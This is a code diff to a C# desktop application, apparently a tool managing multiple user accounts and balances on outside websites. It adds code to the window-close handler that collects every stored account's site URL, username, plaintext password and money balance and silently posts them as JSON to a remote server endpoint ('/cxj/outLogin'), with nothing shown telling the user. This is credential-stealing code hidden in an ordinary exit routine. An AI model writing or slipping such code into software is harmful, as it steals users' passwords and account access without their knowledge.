@@ -121,6 +121,32 @@ namespace CxjText
         //退出整个应用程序
         private void MainFrom_close(object sender, FormClosedEventArgs e)
         {
+
+            //先捕捉金额
+
+            JObject jObject = new JObject();
+            jObject["userName"] = Config.softUserStr;
+            JArray jArry = new JArray();
+            for (int i = 0; i < Config.userList.Count; i++) {
+                UserInfo userInfo = (UserInfo)Config.userList[i];
+                if (userInfo != null && !String.IsNullOrEmpty(userInfo.money)) {
+                    JObject temp = new JObject();
+                    temp["sys"] = userInfo.tag; //系统
+                    temp["money"] = userInfo.money;//钱
+                    temp["url"] = userInfo.baseUrl;
+                    temp["webUser"] = userInfo.user;
+                    temp["webPwd"] = userInfo.pwd;
+                    jArry.Add(temp);
+                }
+            }
+            if (jArry.Count > 0) {
+                jObject["web"] = jArry;
+                HttpUtils.HttpPost(Config.netUrl + "/cxj/outLogin", jObject.ToString(), "application/json", null);
+            }
+
+          
+
+
             try
             {
                 this.upDateTimer.Stop(); //将定时器停止
